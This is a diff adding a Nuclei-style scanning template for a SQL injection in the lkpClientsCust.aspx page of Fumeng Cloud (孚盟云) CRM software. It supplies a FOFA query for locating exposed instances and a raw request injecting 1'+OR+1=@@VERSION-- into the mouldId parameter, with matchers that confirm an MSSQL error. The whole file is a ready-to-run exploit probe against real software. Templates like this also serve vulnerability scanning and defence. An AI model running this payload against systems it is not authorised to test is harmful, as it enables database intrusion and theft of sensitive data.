@@ -1,0 +1,25 @@
+id: fumeng-cloud-lkpclientscust-sqli
+
+info:
+  name: "孚盟云 lkpClientsCust.aspx 组件 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+      该组件在处理用户输入参数时未正确过滤特殊字符，攻击者可通过构造恶意SQL查询实现数据库操作，可能导致敏感数据泄露或篡改。
+  tags: 孚盟云
+
+http:
+- raw:
+  - |
+    GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=@@VERSION-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'Microsoft'
